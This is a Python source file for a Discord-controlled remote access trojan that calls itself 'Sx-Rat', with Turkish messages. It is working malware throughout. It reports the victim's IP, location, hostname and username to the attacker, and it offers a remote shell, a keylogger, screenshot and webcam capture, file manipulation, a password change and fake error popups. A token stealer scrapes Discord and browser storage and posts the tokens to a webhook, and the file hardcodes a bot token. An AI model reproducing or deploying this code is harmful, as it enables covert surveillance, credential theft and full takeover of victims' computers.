import os
import discord
import time
import keyboard as kb
import pyautogui
import random
from discord.ext import commands
from playsound import playsound
import webbrowser
import requests
from PIL import ImageGrab
import asyncio
from tkinter import messagebox
import cv2
from urllib.request import Request, urlopen
import re
import socket
from threading import Thread
import json
import requests
import urllib.request
import re
from bs4 import BeautifulSoup
from discord import File
import subprocess
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="sx.", intents=intents)
token = "NzY3NjUzMDAxNTY0Mzg5Mzg3.GC9VqH.g3YZqMuYAIGW6eqnsWLGiqcGrpQ6avs-lEQzEY"
if os.name == "nt":
  isletim_sistemi = "Windows"
if os.name == "posix":
  isletim_sistemi = "Linux"


@bot.command()
async def restart(ctx, id):
  with open("../../id.txt", "r") as f:
    oku = f.read()
    if oku == id:
      await ctx.send(f"{id}'idsine ait rat yeniden başlatılıyor...")
      os.system(
        "python rat.py")  #BU KISMA RAT BITINCE DIKKAT ET UNUTMA SIKERIM
      exit()


@bot.command()
async def write(ctx, id, *, presse=None):
  with open("../../id.txt", "r") as f:
    oku = f.read()
    if oku == id:
      if presse == None:
        await ctx.send("Karşı tarafın ne yazmasını istiyorsanız yazın")

        def check(m):
          return m.author == ctx.author and m.channel == ctx.channel

        try:
          response = await bot.wait_for('message', check=check, timeout=30.0)
        except asyncio.TimeoutError:
          return
        pyautogui.write(response.content, interval=0.1)
      if presse != None:
        await ctx.send("Karşı tarafın ne yazmasını istiyorsanız yazın...")

        def check(m):
          return m.author == ctx.author and m.channel == ctx.channel

        try:
          response = await bot.wait_for('message', check=check, timeout=30.0)
        except asyncio.TimeoutError:
          return
        pyautogui.write(response.content, interval=0.07)
        pyautogui.press(presse)


class RPSViewFile(discord.ui.View):

  def __init__(self):
    super().__init__(timeout=10)

  @discord.ui.select(placeholder="Dosya Tipini seçiniz",
                     options=[
                       discord.SelectOption(label="html", value=".html"),
                       discord.SelectOption(label="javascript", value=".js"),
                       discord.SelectOption(label="python", value=".py"),
                       discord.SelectOption(label="bat", value=".bat"),
                       discord.SelectOption(label="text file", value=".txt")
                     ])
  async def select(self, select, interaction):
    global secim
    self.secim = select.values[0]
    await interaction.response.send_message(
      f"{interaction.user.mention} Seçim: {self.secim}", )

    await interaction.followup.send(
      f"{interaction.user.mention} oluşturulacak dosyanın adını girin(uzantı değil)"
    )

    def checkname(m):
      return m.author == interaction.user and m.channel == interaction.channel

    try:
      global responsename
      responsename = await bot.wait_for('message',
                                        check=checkname,
                                        timeout=30.0)
    except asyncio.TimeoutError:
      return

    await interaction.followup.send(
      f"{interaction.user.mention} Dosyaya yazılıcakları giriniz")

    def check(m):
      return m.author == interaction.user and m.channel == interaction.channel

    try:
      global response
      response = await bot.wait_for('message', check=check, timeout=30.0)
      with open(f"{responsename.content}{self.secim}", "w") as f:
        f.write(response.content)
    except asyncio.TimeoutError:
      return


@bot.command()
async def delete(ctx, id, filename=None):
  with open("../../id.txt", "r") as f:
    oku = f.read()
    if oku == id:
      if filename != None:
        os.remove(filename)
      if filename == None:
        await ctx.send("Dosya gir")


@bot.command()
async def yardım(ctx):
  msg = """
  ```clear -> kanaldaki mesajları siler\ndelete -> ratlı sistemdeki belirttiğiniz dosyayı siler\nerror -
  > fake error\nget_screen -> ratlı sistemden ss alıp atar\nget_token -> ratlı sistem eğer discord kullanıyorsa tokenini çalar\nget_webcam 
 -> ratlı sistemin webcaminden foto çekip atar\nimha ratlı sistemdeki ratı devre dışı bırakır\nkeylogger -> ratlı sistemde keylogger başlatır
 \nkilitle -> ratlı sistemin mousunu kilitler\nopen_site -> yazdığınız
   site ratlı sistemde açılır\nsearch -> ratlı sistemin google'ında arama yapar\npress -> ratlı sistemde belirttiğiniz tuşa basar
   \nread_file -> ratlı sistemde olan belirttiğiniz dosyayı okursunuz\nrestart ratlı sistemin ratını yeniden başlatır\n
   sessions -> ratın kaç sistemde açık olduğunu ve session idlerini verir\nshell -> ratlı sistemde belirttiğiniz komutları çalıştırır\nshutdown -> ratlı sistemi kapatır
   \nstart -> ratlı sistemde belirttiğiniz dosyayı başlatır\ntemizle -> dc deki tüm kanalları silip genel diye bir kanal oluşturur\nwrite -> ratlı sistemin klavyesinden istediğinizi yazmanızı sağlar
   \nwrite_file -> ratlı sistemde belirttiğiniz formatta bir dosya oluşturur ve istediğinizi yazar\nchange_password -> ratlı sistemin şifresini değiştirir```"""
  await ctx.send(msg)
  await asyncio.sleep(3)
  await ctx.send(":D hadi bana eywallah")


@bot.command()
async def start(ctx, id, filename=None, ext=None):
  with open("../../id.txt", "r") as f:
    oku = f.read()
    if oku == id:
      if filename != None:
        if ext != None:
          if ext == "py":
            os.system(f"python {filename}.{ext}")
          if ext == "bat":
            os.system(f"{filename}.{ext}")
          if ext == "txt":
            os.system(f"{filename}.{ext}")
          if ext == "html":
            os.system(f"{filename}.{ext}")
          if ext == "js":
            os.system(f"node {filename}.{ext}")

      if filename == None:
        await ctx.send("Dosya gir")
        return
      if ext == None:
        await ctx.send("Dosya uzantısı gir(py bat txt html js):")
        return


@bot.command()
async def read_file(ctx, id, location=None):
  with open("../../id.txt", "r") as f:
    oku = f.read()
    if oku == id:
      try:
        with open(location, "r") as readle:
          yazi = readle.read()
          await ctx.send(yazi)
      except:
        await ctx.send("Bir hata oluştu! böyle bir dosya olmayabilir...")
        return


@bot.command()
async def write_file(ctx, id):
  with open("../../id.txt", "r") as f:
    oku = f.read()
    if oku == id:
      embed = discord.Embed(title="Dosya Yazma",
                            description="",
                            color=0x00ff00)

      await ctx.send(embed=embed, view=RPSViewFile())


@bot.command()
async def search(ctx, id, *, ara=None):
  with open("../../id.txt", "r") as f:
    oku = f.read()
    if oku == id:
      if ara == None:
        await ctx.send("Yazmayı unuttun!")
        return
      if ara != None:
        webbrowser.open(f"https://www.google.com/search?q={ara}")


@bot.command()
async def open_site(ctx, id, *, link=None):
  with open("../../id.txt", "r") as f:
    oku = f.read()
    if oku == id:
      if link == None:
        await ctx.send("Yazmayı unuttun!")
        return
      if link != None:
        webbrowser.open(link)


@bot.event
async def on_ready():
  print(f"Hazırım! ({bot.user})")
  data = requests.get("https://geolocation-db.com/json/")
  data = data.json()
  flag = data['country_code']
  lflag = flag.lower()
  uflag = flag.upper()
  city = data['city']
  ip = data['IPv4']
  username = os.getlogin()
  hostname = socket.gethostname()
  await bot.wait_until_ready()
  guild = bot.get_guild(1117762879060459651)  #değiştir
  channel = await guild.create_text_channel(name=username)
  embed = discord.Embed(title="Sx-Rat", description="", color=0x00ff00)
  embed.add_field(name="İp Adresi", value="```" + ip + "```", inline=True)
  embed.add_field(
    name="İşletim Sistemi",
    value="```" + isletim_sistemi + "```",
    inline=True,
  )
  embed.add_field(name="Ülke/Şehir",
                  value=f":flag_{lflag}: ({uflag})/{city}",
                  inline=True)

  hostname = socket.gethostname()

  embed.add_field(name="Session ID", value="```" + sid + "```", inline=True)
  embed.add_field(
    name="PC NAME",
    value="```" + hostname + "```",
    inline=True,
  )
  embed.add_field(
    name = "Oturum Adı",
    value=f"```{username}```",
    inline=True
  )
  embed.add_field(name="Version",
                  value="""```0.5```
```[BETA]```""",
                  inline=True)
  await channel.send("@everyone", embed=embed)


@bot.command()
async def shutdown(ctx, id, time: int):
  with open("../../id.txt", "r") as f:
    oku = f.read()
    if oku == id:
      os.system("shutdown -s -f -t " + time)


@bot.command()
async def antishutdown(ctx, id):
  with open("../../id.txt", "r") as f:
    oku = f.read()
    if oku == id:
      os.system("shutdown -a")


@bot.command()
async def shell(ctx, arg: str):
  with open("../../id.txt", "r") as f:
    oku = f.read()
    if oku == arg:
      await ctx.send(
        "Sx Shell Açıldı! komutlarınızı girin işiniz bitince exit yazmanız yeterlidir"
      )
      while True:

        def check(m):
          return m.author == ctx.author and m.channel == ctx.channel

        try:
          response = await bot.wait_for('message', check=check, timeout=30.0)
        except asyncio.TimeoutError:
          return
        if response.content == "exit":
          await ctx.send("shell kapandı!")
          return

        if "cd" in response.content:
          out = response.content
          directory = out.split(" ")[1]
          outt = subprocess.check_output(f"cd {directory}", shell=True)
          await ctx.send(f"```{outt}```")

        if "dir" in response.content:
          out = response.content
          outt = subprocess.check_output("dir", shell=True)
          await ctx.send(f"```{outt}```")

        if response.content != "exit" and "cd" not in response.content and "dir" not in response.content:
          try:
            if "cd" in response.content:
              out = response.content
              directory = out.split(" ")[1]
              subprocess.run(f"cd {directory}", shell=True)

            if "dir" in response.content:
              out = response.content
              subprocess.run("dir", shell=True)
            out = subprocess.check_output(response.content, shell=True)
            newout = out + b"\n"
            await ctx.send(f"```{newout}```")

          except:
            await ctx.send(
              "Hata oluştu amk şu komudu adam akıllı yaz ya da restart at")
            while True:

              def check(m):
                return m.author == ctx.author and m.channel == ctx.channel

              try:
                response = await bot.wait_for('message',
                                              check=check,
                                              timeout=30.0)
              except asyncio.TimeoutError:
                return
              if response.content == "exit":
                await ctx.send("shell kapandı!")
                return
              if response.content != "exit" and "cd" not in response.content and "dir" not in response.content:
                try:
                  if "cd" in response.content:
                    out = response.content
                    directory = out.split(" ")[1]
                    subprocess.run(f"cd {directory}", shell=True)

                  if "dir" in response.content:
                    out = response.content
                    subprocess.run("dir", shell=True)
                    out = subprocess.check_output(response.content, shell=True)
                    newout = out + b"\n"
                    await ctx.send(f"```{newout}```")

                except:
                  await ctx.send("Lan bak son şansın")
                  while True:

                    def check(m):
                      return m.author == ctx.author and m.channel == ctx.channel

                    try:
                      response = await bot.wait_for('message',
                                                    check=check,
                                                    timeout=30.0)
                    except asyncio.TimeoutError:
                      return
                    if response.content == "exit":
                      await ctx.send("shell kapandı!")
                      return
                    if response.content != "exit" and "cd" not in response.content and "dir" not in response.content:
                      try:
                        if "cd" in response.content:
                          out = response.content
                          directory = out.split(" ")[1]
                          subprocess.run(f"cd {directory}", shell=True)

                        if "dir" in response.content:
                          out = response.content
                          outt = subprocess.check_output("dir", shell=True)
                          await ctx.send(f"```{outt}```")
                        out = subprocess.check_output(response.content,
                                                      shell=True)
                        newout = out + b"\n"
                        await ctx.send(f"```{newout}```")
                      except:
                        await ctx.send(
                          f"Yeter lan git komut öğren gel bu {arg}'idye sahip ratı yeniden başlatıyorum sende git komut bak yrk kafalı"
                        )
                        await asyncio.sleep(3)
                        await ctx.send(
                          f"{arg}'idye sahip ratı {ctx.author.mention} malı yüzünden yeniden başlattım"
                        )
                        os.system(
                          "python3 rat.py"
                        )  #BU KISMA RAT BITINCE DIKKAT ET UNUTMA SIKERIM

                        exit()


@bot.command()
async def get_adolf(ctx):
  webbrowser.open("https://tr.m.wikipedia.org/wiki/Adolf_Hitler")


@bot.command()
async def get_erika(ctx):
  webbrowser.open("https://www.youtube.com/watch?v=4E2KkMYGwus&t=0s")


# property webhook.url
@bot.command()
async def clear(ctx, amount: int = -1):
  if amount == -1:
    await ctx.channel.purge(limit=1000000)
  else:
    await ctx.channel.purge(limit=amount)


@bot.command()
async def get_token(ctx):
  hostname = socket.gethostname()
  webhook = await ctx.channel.create_webhook(name=hostname)

  WEBHOOK_URL = webhook.url
  PING_ME = False

  def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []

    for file_name in os.listdir(path):
      if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
        continue
      for line in [
          x.strip()
          for x in open(f'{path}\\{file_name}', errors='ignore').readlines()
          if x.strip()
      ]:
        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
          for token in re.findall(regex, line):
            tokens.append(token)
    return tokens

  def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
      'Discord': roaming + '\\Discord',
      'Discord Canary': roaming + '\\discordcanary',
      'Discord PTB': roaming + '\\discordptb',
      'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
      'Opera': roaming + '\\Opera Software\\Opera Stable',
      'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
      'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
      if not os.path.exists(path):
        continue

      message += f'\n**{platform}**\n```\n'

      tokens = find_tokens(path)

      if len(tokens) > 0:
        for token in tokens:
          message += f'{token}\n'
      else:
        message += 'Token Bulunamadı.\n'

      message += '```'

    headers = {
      'Content-Type':
      'application/json',
      'User-Agent':
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
      req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
      urlopen(req)
    except:
      pass

  main()


@bot.command()
async def keylogger(ctx, id):
  with open("../../id.txt", "r") as ff:
    name = ff.read()

  if name == id:
    SHOULD_RECORD = True

  def start_rec():
    while SHOULD_RECORD:
      rec = kb.record(until="escape")
      seq = kb.get_typed_strings(rec)
      with open("records.txt", "a") as f:
        f.write("".join(seq) + "\n")

  def stop_rec():
    global SHOULD_RECORD
    SHOULD_RECORD = False

  await asyncio.sleep(20)
  with open("records.txt", "r") as f:
    global oku
    oku = f.read()
  await ctx.send(f"{id} ye sahip olan kullanıcının logları {oku}")

  start_thread = Thread(target=start_rec)
  start_thread.start()

  kb.add_hotkey("ctrl+alt+s", stop_rec)

  kb.wait()


@bot.command()
async def change_password(ctx,id,sifre=None):
  with open("../../id.txt","r") as f:
    oku = f.read()
    if oku == id:
      if sifre != None:
        username = os.getlogin()
        try:
          os.system(f"net user {username} {sifre}")
          await ctx.send("Şifre Değiştirme Başarılı")
        except:
          await ctx.send("Şifre Değiştirilemedi!")
      if sifre == None:
        await ctx.send("şifreyi girmeyi unuttun")


@bot.command()
async def get_id(ctx,ot=None):
  if ot==None:
    await ctx.send("Oturum Adı Girmey Unuttun!")
  if ot != None:
    username = os.getlogin()
    if username == ot:
      with open("../../id.txt","r") as f:
        oku = f.read()
        await ctx.send(f"{ctx.author.mention}``` {username} oturumunun idsi {oku} ```")
tirnak = '"'    

@bot.command()
async def dark_atakan(ctx,id):
  with open("../../id.txt","r") as f:
    oku = f.read()
    if oku == id:
      url = "https://github.com/conedlsz/darkatakan/raw/main/darkatakan.mp3"
      r = requests.get(url)
      with open("darkatakan.mp3", 'wb') as f:
        f.write(r.content)
        f.close()
        await asyncio.sleep(3)
        os.system('''"darkatakan.mp3"''')

      await asyncio.sleep(3)
      webbrowser.open("https://i.ibb.co/vhG552p/darkatakan.png")
      await asyncio.sleep(2)
      img = ImageGrab.grab()
      img.save("screenshot.png")
      with open("screenshot.png", "rb") as f:
        file = File(f)
        await ctx.channel.send(file=file)
      os.remove("screenshot.png")
      cap = cv2.VideoCapture(0)
      ret, frame = cap.read()
      cv2.imwrite('ss.png', frame)
      cap.release()
      with open("ss.png", "rb") as f:
        file = File(f)
        await ctx.channel.send(file=file)
      os.remove("ss.png")


@bot.command()
async def press(ctx, id,tus):
  with open("../../id.txt","r") as f:
    oku = f.read()
    if oku == id:

      if tus == "enter":
        pyautogui.hotkey('enter')
      else:
        for i in tus:
          pyautogui.press(i)


@bot.command()
async def kilitle(ctx):
  while True:
    width, height = pyautogui.size()
    pyautogui.moveTo(width / 2, height / 2)


@bot.command()
async def imha(ctx, arg: str):
  with open("../../id.txt", "r") as f:
    name = f.read()

    if name == arg:
      exit()


@bot.command()
async def get_screen(ctx, id):
  with open("../../id.txt", "r") as f:
    oku = f.read()
    if oku == id:
      img = ImageGrab.grab()
      img.save("screenshot.png")
      with open("screenshot.png", "rb") as f:
        file = File(f)
        await ctx.channel.send(file=file)
      os.remove("screenshot.png")


@bot.command()
async def get_webcam(ctx, id):
  with open("../../id.txt", "r") as f:
    oku = f.read()
    if oku == id:
      cap = cv2.VideoCapture(0)
      ret, frame = cap.read()
      cv2.imwrite('ss.png', frame)
      cap.release()
      with open("ss.png", "rb") as f:
        file = File(f)
        await ctx.channel.send(file=file)
      os.remove("ss.png")


with open("../../id.txt", "w") as f:
  strkr = "1A2a3B4b5C6c78D9d0#E>!eFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz"
  sid = ""
  sessionid = [random.choice(strkr) for i in range(16)]
  for i in sessionid:
    sid += i

  f.write(str(sid))


@bot.command()
async def sessions(ctx):
  with open("../../id.txt","r") as f:
    incele = f.read()
    username = os.getlogin()
  hostname = socket.gethostname()
  sesembed = discord.Embed(title="Sx-Rat", description="", color=0x00ff00)
  sesembed.add_field(name="Session ID",
                     value="```" + str(incele) + "```",
                     inline=True)
  sesembed.add_field(
    name="PC NAME",
    value="```" + hostname + "```",
    inline=True,
  )
  sesembed.add_field(
    name = "Oturum Adı",
    value=f"```{username}```",
    inline=True
  )
  await ctx.send(embed=sesembed)


@bot.command()
async def error(ctx):
  embed = discord.Embed(title="Sx-Rat",
                        description="Vermek İstediğiniz Fake Error'u seçiniz",
                        color=0x00ff00)
  await ctx.send(embed=embed, view=RPSView())


@bot.command()
async def temizle(ctx):
  for c in ctx.guild.channels:
    await c.delete()
  await ctx.guild.create_text_channel(name="genel")


class RPSView(discord.ui.View):

  def __init__(self):
    super().__init__(timeout=10)

  @discord.ui.select(placeholder="Uyarı Başlığını Seçin",
                     options=[
                       discord.SelectOption(label="Hata", value="Error"),
                       discord.SelectOption(label="Uyarı", value="Warning"),
                       discord.SelectOption(label="Sistem Mesajı",
                                            value="System Message")
                     ])
  async def select(self, select, interaction):
    global secim
    self.secim = select.values[0]
    await interaction.response.send_message(
      f"{interaction.user.mention} Seçim: {self.secim}", )
    await interaction.followup.send(
      f"{interaction.user.mention} Hata mesajını giriniz.")

    def check(m):
      return m.author == interaction.user and m.channel == interaction.channel

    try:
      global response
      response = await bot.wait_for('message', check=check, timeout=30.0)
      messagebox.showerror(self.secim, response.content)
    except asyncio.TimeoutError:
      return


bot.run(token)
